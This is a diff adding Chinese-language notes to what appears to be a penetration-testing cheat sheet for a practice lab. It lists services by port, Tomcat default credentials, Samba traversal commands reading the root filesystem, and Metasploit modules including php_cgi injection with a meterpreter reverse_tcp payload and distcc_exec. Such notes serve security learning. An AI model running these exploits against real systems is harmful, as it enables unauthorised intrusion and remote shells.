@@ -28,3 +28,31 @@ Step6:连接
 ```
 ssh root@ip
 ```
+## Metasploit溢出vsftp特权提升漏洞 ##
+**Port:**21
+## Metasploit溢出UnrealIRCd后门漏洞 ##
+**Port:**6667
+## Tomcat管理台默认口令漏洞 ##
+**Port:**8180    
+**Service:** ApacheTomcat/CoyoteJSP engine1.1   
+**Default:**tomcat tomcat
+## sysmlink 默认配置目录遍历漏洞 ##
+**Port:**:445 139   
+**Service:**Samba   
+**Payload:**auxiliary/admin/smb/samba_symlink_traversal
+```
+set SMBSHARE tmp SAM可写文件
+smbclient //ip/tmp 
+cd rootfs 进入root目录
+cat /*
+```
+## Metasploit利用php_cgi漏洞 ##
+**Dir:**cgi-bin
+**Exploit:**exploit/multi/php_cgi_arg_injection
+**Payload:**
+```
+set PAYLOAD /php/meterpreter/reverse_tcp
+```
+## Distcc后门漏洞 ##
+**Port:**3632
+**Exploit:**use exploit/unix/misc/distcc_exec
